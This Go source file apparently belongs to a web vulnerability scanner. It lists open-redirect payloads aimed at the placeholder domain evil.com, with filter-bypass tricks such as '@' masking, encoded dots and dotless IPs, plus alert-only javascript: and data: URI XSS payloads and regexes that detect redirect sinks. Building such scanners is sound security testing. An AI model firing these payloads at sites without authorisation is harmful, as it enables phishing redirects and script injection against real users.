package payloads

// OpenRedirectPayloads provides a list of common Open Redirect payloads designed to bypass filters.
// "evil.com" is used as a placeholder for a malicious domain.
var OpenRedirectPayloads = []string{
	// --- Basic Redirects ---
	"http://evil.com",
	"https://evil.com",

	// --- Protocol-Relative & Scheme Bypasses ---
	"//evil.com",         // Protocol-relative
	"///evil.com",        // Extra slashes
	"\\evil.com",         // Backslash (Windows/IIS)
	"/\\evil.com",        // Forward and backslash (Windows/IIS)
	"https://evil.com./", // Trailing dot in domain name

	// --- Encoding & Obfuscation ---
	"https://evil%2ecom",     // URL-encoded dot
	"http://127.0.0.1",       // Using IP addresses instead of domains
	"http://2130706433/",     // Dotless IP address for 127.0.0.1
	"hTtPs://evil.com",       // Mixed case scheme
	"https%3A%2F%2Fevil.com", // Full URL encoding

	// --- Common Filter Bypass Techniques ---
	"https://whitelisted.com@evil.com", // Using '@' to mask the real domain
	"https://evil.com?whitelisted.com", // Using '?' to trick weak regex
	"https://evil.com#whitelisted.com", // Using '#' to trick weak regex
	"https://whitelisted.com.evil.com", // Using a whitelisted domain as a subdomain
	"//google.com/%2f%2e%2e",           // Using a trusted domain followed by path traversal

	// --- XSS via Redirect Parameters ---
	"javascript:alert('DURSGO_XSS_VIA_REDIRECT')",
	"data:text/html;base64,PHNjcmlwdD5hbGVydCgnRFVSU0dPX1hTU19WSUFfUkVESVJFQ1QnKTwvc2NyaXB0Pg==", // base64 for <script>alert('DURSGO_XSS_VIA_REDIRECT')</script>
}

// OpenRedirectKeywords are regex patterns used to find redirect sinks in HTML/JS content.
var OpenRedirectKeywords = []string{
	// JavaScript location assignments
	`window\.location\s*=\s*['"]?([^'"]+)['"]?`,
	`window\.location\.href\s*=\s*['"]?([^'"]+)['"]?`,
	`window\.location\.assign\s*=\s*['"]?([^'"]+)['"]?`,
	`window\.location\.replace\s*=\s*['"]?([^'"]+)['"]?`,
	`document\.location\s*=\s*['"]?([^'"]+)['"]?`,
	`document\.location\.href\s*=\s*['"]?([^'"]+)['"]?`,
	`window\.navigate\s*=\s*['"]?([^'"]+)['"]?`, // Old IE

	// HTML meta refresh tag
	`<meta\s+http-equiv=["']?refresh["']?\s+content=["']?[^;]+;url=([^"']+)["']?`,

	// Server-side code patterns that might be reflected in the response
	`header\("Location:\s*([^"]+)"\)`,          // PHP
	`res\.redirect\(['"]([^'"]+)['"]\)`,        // Node.js/Express
	`Response\.Redirect\(['"]([^'"]+)['"]\)`,   // ASP.NET
	`HttpResponseRedirect\(['"]([^'"]+)['"]\)`, // Python/Django
	`redirect_to\s+['"]?([^'"]+)['"]?`,         // Ruby on Rails
}
